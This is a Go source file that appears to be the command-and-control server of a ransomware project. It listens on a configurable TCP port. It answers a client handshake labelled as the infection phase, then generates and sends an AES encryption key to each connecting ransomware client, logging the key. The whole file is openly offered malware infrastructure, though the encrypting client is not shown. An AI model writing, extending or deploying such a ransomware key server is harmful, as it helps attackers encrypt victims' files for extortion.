package main

import (
	"fmt"
	"log"
	"net"
	"os"
	"ransomware_server/utilities"

	"github.com/joho/godotenv"
)

func main() {

	// Load .env file
	err := godotenv.Load()
	if err != nil {
		log.Panicf("Error loading .env file: %v", err.Error())
	}

	// Setup server startup information
	protocol := os.Getenv("PROTOCOL")
	listeningAddress := os.Getenv("LISTEN_ADDRESS")
	listeningPort := os.Getenv("LISTEN_PORT")
	listeningURL := listeningAddress + ":" + listeningPort
	fmt.Printf("Listening on %s\n", listeningURL)

	// Listening
	listener, err := net.Listen(protocol, listeningURL)
	if err != nil {
		log.Panicf("Error listening: %v", err.Error())
	}
	defer listener.Close()

	// Making a loop to accept incoming connections
	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Panicf("Error accepting: %v", err.Error())
		}

		// Handle the connection
		go handleClientConnection(conn)
	}
}

func handleClientConnection(conn net.Conn) {
	defer func() {
		utilities.ClientConnectionLog(conn.RemoteAddr().String(), "Connection closed.")
		conn.Close()
	}()

	utilities.ClientConnectionLog(conn.RemoteAddr().String(), "Connection accepted.")

	// Read data from client
	buffer := make([]byte, 1024)
	n, err := conn.Read(buffer)
	if err != nil {
		log.Panicf("Error reading: %v", err.Error())
	}

	// Process client request
	request := string(buffer[:n])
	response := ""

	switch request {
	case "KNIGHTCHASER_MALWARE_DEPOT_RANSOMWARE_CLIENT:ESTABLISHCONNECTION":
		response = "Connection established."
		utilities.ClientConnectionLog(conn.RemoteAddr().String(), "(Phase 1) Infectioning connection established.")
	case "KNIGHTCHASER_MALWARE_DEPOT_RANSOMWARE_CLIENT:GETENCRYPTIONKEY":
		cryptographicKey := utilities.GenerateAESKey()
		response = string(cryptographicKey)
		utilities.ClientConnectionLog(conn.RemoteAddr().String(), "(Phase 2) Encryption key sent, key: "+response)
	default:
		response = "Unknown request."
		utilities.ClientConnectionLog(conn.RemoteAddr().String(), "Unknown request. (terminate session immediately)")
		return
	}

	// Send response to client
	_, err = conn.Write([]byte(response))
	if err != nil {
		log.Panicf("Error writing: %v", err.Error())
	}
}
